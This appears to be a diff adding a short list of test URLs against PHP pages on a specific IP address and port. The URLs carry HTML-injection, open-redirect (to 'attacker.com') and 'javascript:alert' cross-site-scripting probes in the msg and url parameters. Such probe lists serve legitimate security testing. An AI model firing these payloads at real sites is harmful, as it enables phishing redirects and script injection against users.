@@ -1,0 +1,5 @@
+http://77.240.106.43:8083/confirm.php?msg=heloo%3Cimg%20
+http://77.240.106.43:8083/warning.php?msg=fffff
+http://77.240.106.43:8083/error.php?msg=fffff
+http://77.240.106.43:8083/warning.php?msg=%3Ch2%3Eplease%20login%20to%20continue%3C/h2%3E&url=http://attacker.com
+http://77.240.106.43:8083/warning.php?msg=%3Ch2%3Eplease%20login%20to%20continue%3C/h2%3E&url=javascript:alert(999)
